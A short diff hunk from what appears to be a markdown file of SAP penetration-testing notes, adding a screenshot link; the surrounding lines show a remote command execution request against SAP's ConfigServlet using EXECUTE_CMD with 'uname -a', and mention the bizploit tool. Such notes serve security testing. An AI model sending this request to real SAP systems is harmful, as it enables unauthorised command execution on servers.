@@ -226,6 +226,8 @@ Matching Modules
 ```
 http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
 ```
+![alt text](https://github.com/shipcod3/mySapAdventures/blob/master/screengrabs/sap_rce.jpeg)
+
 - Before running the ```start``` command on the bizploit script at the Discovery phase, you can also add the following for performing vulnerability assessment:
 ```
 bizploit> plugins
